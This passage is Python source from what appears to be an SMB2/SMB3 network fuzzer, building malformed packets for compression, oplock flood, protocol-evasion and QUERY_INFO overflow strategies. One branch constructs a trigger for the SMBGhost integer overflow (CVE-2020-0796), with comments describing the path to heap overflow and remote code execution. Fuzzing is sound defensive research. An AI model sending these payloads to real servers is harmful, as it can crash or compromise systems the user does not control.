            return pre + _compress(inner, algo=0xFFFF)
        elif v == "decomp_bomb":
            bomb = b'\x00' * 32 + b'\xFF' * 32
            return pre + _compress(bomb, orig_size=0x10000000)
        elif v == "chain_overflow":
            return pre + _compress(inner, flags=0x0001, offset=0xFFFFFFFF)
        elif v == "pattern_junk":
            return pre + _compress(b'\xAA' * 100, algo=0x0004)
        elif v == "orig_size_overflow":
            return pre + _compress(inner, orig_size=0xFFFFFFFF)
        elif v == "smbghost_overflow":
            # CVE-2020-0796: Integer overflow in srv2.sys compression handler.
            # OriginalSize + Offset must wrap past 0xFFFFFFFF so the kernel
            # allocates a tiny buffer (wrapped sum) but the decompressor writes
            # OriginalSize bytes into it → heap buffer overflow → RCE.
            # We pick random pairs where (orig + off) & 0xFFFFFFFF is small.
            target_alloc = random.choice([0x10, 0x20, 0x40, 0x100])
            orig = random.choice([0xFFFFFFEF, 0xFFFFF000, 0xFFFF0000, 0xFFFFFFF0])
            off = (target_alloc - orig) & 0xFFFFFFFF  # wraps to target_alloc
            # Build a minimal LZNT1 compressed payload: a single chunk that
            # decompresses to more data than the (small) allocation.
            # LZNT1 uncompressed chunk: 2-byte header (size | 0x0000) + raw data
            raw_body = b'\x41' * 0x100  # 256 bytes of 'A'
            lznt1_chunk_hdr = struct.pack("<H", (len(raw_body) - 1) & 0x0FFF)
            lznt1 = lznt1_chunk_hdr + raw_body + b'\x00\x00'  # terminator
            return pre + _compress(lznt1, algo=0x0001, flags=0,
                                   offset=off, orig_size=orig)
        else:
            bad = b'\xFF\xFF\xFF\xFF' + b'\x00' * 64
            return pre + _compress(bad, algo=0x0002)

    # ---- 14. OPLOCK/LEASE FLOOD ----
    elif strategy == "oplock_lease_flood":
        v = random.choice(["break_level", "unknown_key", "rapid_cycle",
                           "conflict_state", "ack_no_break", "version_mix"])
        if v == "break_level":
            hdr = _smb2(SMB2_OPLOCK_BREAK, mid=1, sid=1, tid=1)
            body = struct.pack("<HBB", 24, 0xFF, 0) + os.urandom(16) + b'\x00' * 4
            return pre + _wrap(hdr + body)
        elif v == "unknown_key":
            msgs = b''
            for i in range(200):
                hdr = _smb2(SMB2_OPLOCK_BREAK, mid=i+1, sid=1, tid=1)
                body = struct.pack("<HBB", 36, 0, 0) + os.urandom(16)
                body += struct.pack("<IQ I", 0, 0, 7)
                msgs += _wrap(hdr + body)
            return pre + msgs
        elif v == "rapid_cycle":
            msgs = b''
            for i in range(500):
                cmd = SMB2_CREATE if i % 2 == 0 else SMB2_CLOSE
                hdr = _smb2(cmd, mid=i+1, sid=1, tid=1)
                if cmd == SMB2_CREATE:
                    n = f"f{i}.tmp".encode("utf-16-le")
                    body = struct.pack("<BBIIIIQQI", 57, 0, 2, 2, 0, 0, 0x12019F, 0x80, 7)
                    body += struct.pack("<IIHH", 1, 0x40, 120, len(n))
                    body += struct.pack("<II", 0, 0) + n
                else:
                    body = struct.pack("<HH", 24, 0) + struct.pack("<I", 0) + os.urandom(16)
                msgs += _wrap(hdr + body)
            return pre + msgs
        elif v == "conflict_state":
            msgs = b''
            lk = os.urandom(16)
            for state in [0x01, 0x03, 0x05, 0x07, 0xFF]:
                hdr = _smb2(SMB2_OPLOCK_BREAK, mid=state, sid=1, tid=1)
                body = struct.pack("<HBB", 36, 0, 0) + lk
                body += struct.pack("<IQ I", 0, 0, state)
                msgs += _wrap(hdr + body)
            return pre + msgs
        elif v == "ack_no_break":
            hdr = _smb2(SMB2_OPLOCK_BREAK, mid=1, sid=1, tid=1)
            body = struct.pack("<HBB", 24, 0x01, 0) + os.urandom(16) + b'\x00' * 4
            return pre + _wrap(hdr + body) * 100
        else:
            msgs = b''
            for i in range(100):
                hdr = _smb2(SMB2_OPLOCK_BREAK, mid=i+1, sid=1, tid=1)
                if i % 2 == 0:
                    body = struct.pack("<HBB", 24, 0x01, 0) + os.urandom(16) + b'\x00' * 4
                else:
                    body = struct.pack("<HBB", 36, 0, 0) + os.urandom(16)
                    body += struct.pack("<IQ I", 0, 0, 7)
                msgs += _wrap(hdr + body)
            return pre + msgs

    # ---- 15. MULTI-PROTOCOL EVASION ----
    elif strategy == "multi_protocol_evasion":
        v = random.choice(["smb1_hdr_smb2_body", "interleaved", "http_445",
                           "proto_switch", "raw_junk", "tls_wrap"])
        if v == "smb1_hdr_smb2_body":
            smb1h = SMB1_MAGIC + struct.pack("<B", 0) + b'\x00' * 27
            smb2body = struct.pack("<HHHI", 36, 1, 1, 0) + struct.pack("<I", 0) + _guid()
            smb2body += struct.pack("<IHH", 0, 0, 0) + struct.pack("<H", SMB2_DIALECT_311)
            return _wrap(smb1h + smb2body)
        elif v == "interleaved":
            msgs = b''
            for i in range(100):
                if i % 2 == 0:
                    msgs += _wrap(_smb2(SMB2_ECHO, mid=i+1) + _echo_body())
                else:
                    msgs += _wrap(_smb1(0x25) + b'\x00' + struct.pack("<H", 0))
            return pre + msgs
        elif v == "http_445":
            http = b"GET / HTTP/1.1\r\nHost: victim\r\n\r\n"
            return _nb(len(http)) + http
        elif v == "proto_switch":
            return pre + _wrap(_smb1(0x72) + b'\x00' + struct.pack("<H", 14) + b'\x02NT LM 0.12\x00')
        elif v == "raw_junk":
            return os.urandom(200) + pre
        else:
            tls_hello = b'\x16\x03\x01\x00\x05\x01\x00\x00\x01\x00'
            return _nb(len(tls_hello)) + tls_hello + pre

    # ---- 16. QUERY_INFO OVERFLOW ----
    elif strategy == "query_info_overflow":
        v = random.choice(["invalid_class", "huge_output", "sec_desc",
                           "ea_list", "quota", "boundary_len"])
        fid = os.urandom(16)
        def _qi(info_type, info_class, output_len=65536, in_data=b'', mid=1):
            hdr = _smb2(SMB2_QUERY_INFO, mid=mid, sid=1, tid=1)
            in_off = 64 + 40 if in_data else 0
            body = struct.pack("<HBB I I", 41, info_type, info_class, output_len, 0)
            body += struct.pack("<HH", in_off, len(in_data))
            body += struct.pack("<I", 0)  # AdditionalInfo
            body += struct.pack("<I", 0)  # Flags
            body += fid
            body += in_data
            return _wrap(hdr + body)
        if v == "invalid_class":
            return pre + _qi(0xFF, 0xFF)
        elif v == "huge_output":
            return pre + _qi(1, 18, output_len=0xFFFFFFFF)
        elif v == "sec_desc":
            sd = b'\x01\x00' + b'\xFF' * 60000
            hdr = _smb2(SMB2_SET_INFO, mid=1, sid=1, tid=1)
            body = struct.pack("<HBB I", 33, 3, 0, len(sd))
            body += struct.pack("<HH", 64 + 32, 0x04 | 0x02 | 0x01)
            body += struct.pack("<I", 0) + fid + sd
            return pre + _wrap(hdr + body)
        elif v == "ea_list":
            ea = b''
            for i in range(500):
                n = f"EA{i}".encode()
                ea += struct.pack("<BBH", 0, len(n), 0) + n + b'\x00'
            return pre + _qi(1, 15, in_data=ea)
        elif v == "quota":
            q = struct.pack("<I", 0) + struct.pack("<I", 0) + os.urandom(24)
            q = q * 500
            hdr = _smb2(SMB2_SET_INFO, mid=1, sid=1, tid=1)
            body = struct.pack("<HBB I", 33, 4, 0, len(q))
            body += struct.pack("<HH", 96, 0) + struct.pack("<I", 0) + fid + q
            return pre + _wrap(hdr + body)
        else:
            msgs = b''
            for bl in [0, 1, 0xFFFF, 0xFFFFFFFF, 0x7FFFFFFF]:
                msgs += _qi(1, 18, output_len=bl, mid=bl & 0xFFFF)
            return pre + msgs

    # Fallback: valid ECHO
    else:
        return pre + _wrap(_smb2(SMB2_ECHO, mid=1) + _echo_body())


class Smb2Mutator:
    """SMBv2 mutator — 13 strategies targeting SMB2 protocol internals."""
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = SMB2_STRATEGIES
        self._default_weights = SMB2_WEIGHTS
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return self._default_weights

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload = build_smb_payload(strategy, payload_override=payload_override)
        return payload, strategy


class Smb3Mutator:
    """SMBv3 mutator — 5 strategies targeting SMB3-specific features."""
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = SMB3_STRATEGIES
        self._default_weights = SMB3_WEIGHTS
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return self._default_weights

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload = build_smb_payload(strategy, payload_override=payload_override)
        return payload, strategy


# Legacy alias
SmbMutator = Smb2Mutator
